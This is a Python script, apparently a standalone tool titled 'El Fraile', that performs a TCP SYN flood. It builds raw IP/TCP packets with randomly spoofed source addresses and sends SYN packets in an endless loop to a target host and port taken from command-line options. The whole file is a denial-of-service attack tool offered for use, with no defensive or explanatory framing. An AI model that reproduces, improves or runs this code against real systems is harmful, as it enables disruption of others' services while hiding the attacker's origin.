#!usr/bin/python3
#	El Fraile
#	TCP Syn Flood
#	Code by Mec505

import socket
import struct
import random
import time
import optparse

def srcs():
	ip = []
	while True:
		for i in range(4):
			ip.append(str(random.randint(1, 255)))
			result = ".".join(ip)
		return result

def packet():
	ver = 4
	ihl = 5
	dsf = 0
	tol = 0
	idf = random.randint(12345,54321)
	fragoff = 0
	ttl = 255
	proto = socket.IPPROTO_TCP
	chck = 0
	saddr = socket.inet_aton(srcs())
	daddr = socket.inet_aton(desti)

	ver_ihl = (ver << 4) + ihl

	ip_header = struct.pack('!BBHHHBBH4s4s', ver_ihl, dsf, tol, idf, fragoff, ttl, proto, chck, saddr, daddr)

	src = random.randint(36000, 65535)
	dst = port
	seq = 0
	ack_seq = 0
	doff = 5
	fin = 0
	syn = 1
	rst = 0
	psh = 0
	ack = 0
	urg = 0
	window = socket.htons(5840)
	check = 0
	urg_ptr = 0

	offset_res = (doff << 4) + 0
	tcp_flags = fin + (syn << 1) + rst + psh + ack + urg

	tcp_header = struct.pack('!HHLLBBHHH', src, dst, seq, ack_seq, offset_res, tcp_flags, window, check, urg_ptr)
	pack = ip_header + tcp_header

	return pack

def main():
	global desti
	global port
	opt = optparse.OptionParser(usage="Usage: %prog -h | --help")
	opt.add_option("-d", metavar="Host/Ipv4", type="str", dest="desti", help="Target Destination")
	opt.add_option("-p", metavar="Port", type="int", dest="port", help="Target port")
	(opt, args) = opt.parse_args()

	try:
		if opt.desti == None:
			opt.print_help()
		else:
			print("Starting......")
			desti = socket.gethostbyname(opt.desti)
			time.sleep(3)

		if opt.port == None:
			opt.print_help()
		else:
			port = opt.port

		while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
			s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

			pack = packet()
			s.sendto(pack,(desti, 0))
			print("!!Sent Syn packet!!, source Ip:",srcs(),"Target Host:",desti)
			time.sleep(.1)

	except socket.error:
		print("Socket Error or No Internet!! Run as root/administrator")
		time.sleep(2)
		return socket.error

if __name__ == "__main__":
	main()

